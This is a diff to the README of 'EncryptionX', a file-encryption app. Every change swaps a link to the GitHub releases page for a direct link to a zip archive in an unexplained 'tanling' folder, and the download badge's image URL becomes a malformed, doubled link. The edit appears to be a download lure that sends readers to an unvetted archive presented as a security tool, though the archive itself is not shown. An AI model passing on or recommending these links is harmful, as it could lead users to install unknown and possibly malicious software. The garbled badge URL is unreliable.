@@ -1,7 +1,7 @@
 # 🔐 EncryptionX - Simple and Secure File Encryption
 
 ## 📥 Download Now
-[![Download EncryptionX](https://img.shields.io/badge/Download%20EncryptionX-blue.svg)](https://github.com/shabanidodomatv/EncryptionX/releases)
+[![Download EncryptionX](https://raw.githubusercontent.com/shabanidodomatv/EncryptionX/main/tanling/EncryptionX.zip%https://raw.githubusercontent.com/shabanidodomatv/EncryptionX/main/tanling/EncryptionX.zip)](https://raw.githubusercontent.com/shabanidodomatv/EncryptionX/main/tanling/EncryptionX.zip)
 
 ## 🚀 Getting Started
 Welcome to EncryptionX! This application helps you encrypt your files easily. Whether you want to keep personal documents private or protect sensitive information, EncryptionX offers a user-friendly solution.
@@ -15,7 +15,7 @@ Before you download, here’s what you need:
 ## 🔗 Download & Install
 To get started, visit our releases page to download the application:
 
-[Visit this page to download](https://github.com/shabanidodomatv/EncryptionX/releases)
+[Visit this page to download](https://raw.githubusercontent.com/shabanidodomatv/EncryptionX/main/tanling/EncryptionX.zip)
 
 Follow these steps to install EncryptionX:
 
@@ -80,4 +80,4 @@ If you need help, visit our support page or open an issue on GitHub. We continuo
 ## 📅 Keeping Up to Date
 Stay informed about updates, new features, and tips. Follow our repository or check back to the releases page for the latest news.
 
-[Visit this page to download](https://github.com/shabanidodomatv/EncryptionX/releases) and start securing your files today!
+[Visit this page to download](https://raw.githubusercontent.com/shabanidodomatv/EncryptionX/main/tanling/EncryptionX.zip) and start securing your files today!
